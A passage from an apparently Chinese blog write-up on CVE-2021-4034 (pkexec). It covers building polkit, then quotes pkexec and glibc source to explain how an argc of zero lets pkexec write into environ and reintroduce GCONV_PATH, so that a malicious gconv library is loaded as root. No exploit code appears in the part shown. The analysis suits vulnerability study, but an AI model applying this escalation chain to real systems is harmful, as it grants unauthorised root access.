non-free</span></span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面有一个 <code>INSTALL</code>  的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libc6-dev</span><br><span class="line">apt install gobjc++</span><br><span class="line">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure><p>遇到问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checking whether the C compiler works... no</span><br><span class="line">configure: error: in `/home/vol/policykit<span class="number">-1</span><span class="number">-0.105&#x27;</span>:</span><br><span class="line">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure><p>看 <code>config.log</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">configure:<span class="number">3355</span>: $? = <span class="number">1</span></span><br><span class="line">configure:<span class="number">3375</span>: checking whether the C compiler works</span><br><span class="line">configure:<span class="number">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class="number">5</span></span><br><span class="line">/usr/bin/ld: cannot find -lposix</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br></pre></td></tr></table></figure><p>安装库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install manpages-posix-dev</span><br></pre></td></tr></table></figure><p>也没用，索性不加 <code>posix</code>  试试看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=c99 CFLAGS=-g <span class="comment">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure><p>继续报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class="line">is in your PATH or <span class="built_in">set</span> the PKG_CONFIG environment variable to the full</span><br><span class="line">path to pkg-config.</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure><p>继续报错</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class="line"></span><br><span class="line">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure><p>然后又来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure><p>这是因为缺少 <code>libpam.so</code>  的库，在 debian 系统上，可以这样下载  <code>lib + id-dev</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure><p>继续报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> intltool &gt;= <span class="number">0.40</span><span class="number">.0</span>...  found</span><br><span class="line">configure: error: Your intltool is too old.  You need intltool <span class="number">0.40</span><span class="number">.0</span> or later.</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install intltool</span><br></pre></td></tr></table></figure><p>configure 没问题了 make 来了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">polkitagentsession.c:<span class="number">58</span>:<span class="number">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class="line">   <span class="number">58</span> | <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libglib2.0</span><br><span class="line">apt-get install libgio2.0</span><br></pre></td></tr></table></figure><p>还是没用<br>发现 <code>gio-unix-2.0*</code>  下面就是 <code>gio</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure><h2 id="原理分析"><a class="markdownIt-Anchor" href="#原理分析">#</a> 原理分析</h2><h3 id="数组越界"><a class="markdownIt-Anchor" href="#数组越界">#</a> 数组越界</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ·······</span><br><span class="line">  <span class="type">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class="line">    <span class="string">&quot;SHELL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LINGUAS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANGUAGE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_ALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TERM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;COLORTERM&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class="line"><span class="comment">     * general case. See</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class="line"><span class="comment">     * which previously used e. g. gksu, by setting the</span></span><br><span class="line"><span class="comment">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class="line"><span class="comment">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="string">&quot;DISPLAY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;XAUTHORITY&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  &#125;;</span><br><span class="line">  GPtrArray *saved_env;</span><br><span class="line">  gchar *opt_user;</span><br><span class="line">  <span class="type">pid_t</span> pid_of_caller;</span><br><span class="line">  gpointer local_agent_handle;</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">127</span>;</span><br><span class="line">  authority = <span class="literal">NULL</span>;</span><br><span class="line">  subject = <span class="literal">NULL</span>;</span><br><span class="line">  details = <span class="literal">NULL</span>;</span><br><span class="line">  result = <span class="literal">NULL</span>;</span><br><span class="line">  action_id = <span class="literal">NULL</span>;</span><br><span class="line">  saved_env = <span class="literal">NULL</span>;</span><br><span class="line">  path = <span class="literal">NULL</span>;</span><br><span class="line">  command_line = <span class="literal">NULL</span>;</span><br><span class="line">  opt_user = <span class="literal">NULL</span>;</span><br><span class="line">  local_agent_handle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for correct invocation */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">geteuid</span> () != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;pkexec must be setuid root\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  original_user_name = <span class="built_in">g_strdup</span> (<span class="built_in">g_get_user_name</span> ());</span><br><span class="line">  <span class="keyword">if</span> (original_user_name == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;Error getting user name.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((original_cwd = <span class="built_in">g_get_current_dir</span> ()) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;Error getting cwd: %s\n&quot;</span>,</span><br><span class="line">                  <span class="built_in">g_strerror</span> (errno));</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class="line"><span class="comment">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  opt_show_help = FALSE;</span><br><span class="line">  opt_show_version = FALSE;</span><br><span class="line">  opt_disable_internal_agent = FALSE;</span><br><span class="line">  <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_show_help = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--version&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_show_version = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--user&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;-u&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          n++;</span><br><span class="line">          <span class="keyword">if</span> (n &gt;= (guint) argc)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">usage</span> (argc, argv);</span><br><span class="line">              <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (opt_user != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">g_printerr</span> (<span class="string">&quot;--user specified twice\n&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">          opt_user = <span class="built_in">g_strdup</span> (argv[n]);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--disable-internal-agent&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_disable_internal_agent = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>90 行 n 是从 1 开始的<br> 120 行 break 是退出循环，说明是要执行的命令<br>后面部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">g_assert</span> (argv[argc] == <span class="literal">NULL</span>);</span><br><span class="line">path = <span class="built_in">g_strdup</span> (argv[n]);</span><br><span class="line"><span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">usage</span> (argc, argv);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class="line">    s = <span class="built_in">g_find_program_in_path</span> (path);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">g_printerr</span> (<span class="string">&quot;Cannot run program %s: %s\n&quot;</span>, path, <span class="built_in">strerror</span> (ENOENT));</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">g_free</span> (path);</span><br><span class="line">    path = s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class="line"><span class="comment">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (argv[n] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      argv[n] = path;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><code>g_find_program_in_path (path)</code>  搜索命令的绝对路径</li><li>绝对路径被回写回 <code>argv[n]</code></li></ul><p>对于命令行参数 <code>argv[]</code>  是在 <code>environ[]</code>  之后连着被压入的<br>命令行启动 <code>pkexec</code> ，第一个参数是自己 <code>&quot;pkexec&quot;</code> <br> 但是如果用 <code>execve</code>  启动，第一个就是 <code>NULL</code>  了，第二个就是环境变量 <code>environ[0]</code></p><h3 id="dl坏事做尽"><a class="markdownIt-Anchor" href="#dl坏事做尽">#</a> dl 坏事做尽</h3><p>glibc2.27 ****/elf/dl-support.c : 307</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_non_dynamic_init (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ········</span><br><span class="line">  ········</span><br><span class="line">  <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">static</span> <span class="type">const</span> <span class="type">char</span> unsecure_envvars[] =</span><br><span class="line">UNSECURE_ENVVARS</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class="line">EXTRA_UNSECURE_ENVVARS</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *cp = unsecure_envvars;</span><br><span class="line">      <span class="comment">// 清除不安全的环境变量</span></span><br><span class="line">      <span class="keyword">while</span> (cp &lt; unsecure_envvars + <span class="built_in">sizeof</span> (unsecure_envvars))</span><br><span class="line">&#123;</span><br><span class="line">  __unsetenv (cp);</span><br><span class="line">  cp = (<span class="type">const</span> <span class="type">char</span> *) __rawmemchr (cp, <span class="string">&#x27;\0&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line">      <span class="keyword">if</span> (__access (<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class="number">0</span>)</span><br><span class="line">__unsetenv (<span class="string">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class="line">  DL_PLATFORM_INIT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class="line">  DL_OSVERSION_INIT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Now determine the length of the platform string.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_platform != <span class="literal">NULL</span>)</span><br><span class="line">    _dl_platformlen = <span class="built_in">strlen</span> (_dl_platform);</span><br><span class="line">  <span class="comment">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint_fast16_t</span> i = <span class="number">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class="line">      <span class="keyword">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class="line">&#123;</span><br><span class="line">  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class="line">DL_SYSINFO_IMPLEMENTATION</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_STATIC_PIE</span></span><br><span class="line"><span class="comment">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class="line"><span class="comment">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span> *</span><br><span class="line">_dl_get_dl_main_map (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;_dl_main_map;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>而 <code>UNSECURE_ENVVARS</code>  的变量是定义在 glibc-2.27/sysdeps/generic/unsecvars.h : 10</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GLIBC_TUNABLES_ENVVAR <span class="string">&quot;GLIBC_TUNABLES\0&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class="line"><span class="comment">   all stuffed in a single string which means they have to be terminated</span></span><br><span class="line"><span class="comment">   with a &#x27;\0&#x27; explicitly.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSECURE_ENVVARS \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;GCONV_PATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;GETCONF_DIR\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  GLIBC_TUNABLES_ENVVAR      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;HOSTALIASES\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_AUDIT\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DEBUG\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DEBUG_OUTPUT\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DYNAMIC_WEAK\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_HWCAP_MASK\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_LIBRARY_PATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_ORIGIN_PATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_PRELOAD\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_PROFILE\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_SHOW_AUXV\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_USE_LOAD_BIAS\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LOCALDOMAIN\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LOCPATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;MALLOC_TRACE\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;NIS_PATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;NLSPATH\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;RESOLV_HOST_CONF\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;RES_OPTIONS\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;TMPDIR\0&quot;</span>      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;TZDIR\0&quot;</span></span></span><br></pre></td></tr></table></figure><p>当检测程序是特权文件的时候，会清空上面的环境变量<br>所以不能直接当环境变量传入<br>但这次我们有一次任意写机会<br>需要劫持环境变量引入我们的恶意库</p><h3 id="劫持环境变量"><a class="markdownIt-Anchor" href="#劫持环境变量">#</a> 劫持环境变量</h3><p>利用的环境变量是 <code>GCONV_PATH</code> <br><a href="https://trganda.github.io/posts/iconv/">https://trganda.github.io/posts/iconv/</a></p><blockquote><p>In <a href="https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces">interface</a>, the usage of these gconv module were defined in a configuration file with name gconv-modules.</p></blockquote><ul><li><code>iconv</code>  转换字符集</li><li><code>iconv</code>  是在一个动态库 <code>gconv module</code></li><li>动态库 <code>gconv module</code>  定义在配置文件夹 <code>gconv-modules</code>  里</li><li>会调用这个文件夹 <code>gconv-modules</code>  下的 <code>so</code>  文件中的 <code>gconv()</code>  和 <code>gconv_init()</code></li></ul><p>The default  <code>gconv module</code>  and  <code>gconv module configuration</code>  file was located in:</p><ul><li>/usr/lib/gconv: Usual default gconv module path.</li><li>/usr/lib/gconv/gconv-modules: Usual system default gconv module configuration file.</li><li>/usr/lib/gconv/gconv-modules.cache: Usual system gconv module configuration cache</li></ul><p>可以看看 iconv 的 help</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class="line">Usage: iconv [OPTION...] [FILE...]</span><br><span class="line">Convert encoding of given files from one encoding to another.</span><br><span class="line"></span><br><span class="line"> Input/Output format specification:</span><br><span class="line">  -f, --from-code=NAME       encoding of original text</span><br><span class="line">  -t, --to-code=NAME         encoding for output</span><br><span class="line"></span><br><span class="line"> Information:</span><br><span 